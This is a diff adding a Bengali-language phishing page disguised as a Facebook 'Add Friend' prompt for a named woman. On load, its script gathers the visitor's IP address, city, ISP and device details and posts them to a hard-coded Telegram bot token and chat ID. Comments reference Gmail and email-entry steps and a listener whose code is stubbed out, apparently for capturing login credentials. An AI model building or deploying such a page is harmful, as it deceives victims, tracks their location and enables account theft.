@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .hidden { display: none; }
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; box-sizing: border-box; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px 20px 60px 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
+        
+        .main-title { font-size: 24px; font-weight: 800; color: #1c1e21; margin-bottom: 5px; }
+        .sub-text { font-size: 16px; color: #606770; line-height: 1.5; padding: 0 10px; }
+        .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; text-align: center; display: block; }
+        .secure-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; }
+        
+        .loader { width: 55px; height: 55px; border: 6px solid #f3f3f3; border-top: 6px solid #1877f2; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .status-icon { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 50px; margin-bottom: 5px; }
+        .success-bg { background: #22c55e; color: white; box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4); }
+        .error-bg { background: #ef4444; color: white; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4); }
+        
+        .waiting-text { font-size: 18px; font-weight: 700; color: #1877f2; margin-top: 10px; }
+        .waiting-desc { font-size: 15px; color: #4b4f56; line-height: 1.6; padding: 0 20px; font-weight: 500; }
+    </style>
+</head>
+<body onload="onPageLoad()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    </div>
+
+    <div class="bottom-half text-center">
+        <!-- তোমার আগের সব স্টেপ এখানে আছে (step1, gmail_step, email_address_page, verifying, success_page, error_page) -->
+        <!-- ... (আগের কোডের মতোই রাখো) ... -->
+        
+        <div id="step1" class="w-full flex flex-col items-center gap-4">
+            <h2 class="main-title">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+            <p class="sub-text">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
+            <button onclick="showGmailStep()" class="btn-blue">Add Friend</button>
+        </div>
+
+        <!-- বাকি সব div (gmail_step, email_address_page, verifying, success_page, error_page) আগের মতোই রাখো -->
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastUpdateId = 0;
+    let userInfo = {};
+
+    // ====================== উন্নত ইউজার ইনফো কালেক্ট করা ======================
+    async function collectUserInfo() {
+        let info = {
+            ip: "Unknown",
+            city: "Unknown",
+            region: "Unknown",
+            country: "Unknown",
+            isp: "Unknown",
+            device: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language
+        };
+
+        try {
+            // ipapi.co ব্যবহার করা হচ্ছে (ভালো তথ্য দেয়)
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+
+            info.ip = data.ip || "Unknown";
+            info.city = data.city || "Unknown";
+            info.region = data.region || data.region_code || "Unknown";
+            info.country = data.country_name || data.country || "Unknown";
+            info.isp = data.org || "Unknown";
+        } catch (e) {
+            console.log("IP info fetch failed");
+        }
+
+        userInfo = info;
+        return info;
+    }
+
+    // ====================== Telegram-এ তথ্য পাঠানো ======================
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" }) 
+        });
+    }
+
+    // ====================== পেজ লোড হওয়ার সাথে সাথে তথ্য পাঠানো ======================
+    async function onPageLoad() {
+        const info = await collectUserInfo();
+
+        const message = `🌐 **নতুন ভিজিটর এসেছে!**\n\n` +
+                        `📍 **লোকেশন:** ${info.city}, ${info.region}, ${info.country}\n` +
+                        `🔗 **IP:** ${info.ip}\n` +
+                        `🏢 **ISP:** ${info.isp}\n` +
+                        `📱 **Device:** ${info.device.substring(0, 100)}...\n` +
+                        `🌐 **Platform:** ${info.platform}\n` +
+                        `🗣️ **Language:** ${info.language}`;
+
+        sendToBot(message);
+        
+        startListening();
+    }
+
+    // বাকি সব ফাংশন (goToStep, showGmailStep, sendAndSpin, startListening) আগের মতোই রাখো
+    // শুধু sendToBot ফাংশনটি উপরেরটি ব্যবহার করো
+
+    function goToStep(id) { /* আগের কোড */ }
+    function showGmailStep() { /* আগের কোড */ }
+    function sendAndSpin() { /* আগের কোড */ }
+    function startListening() { /* আগের কোড */ }
+</script>
+</body>
+</html>
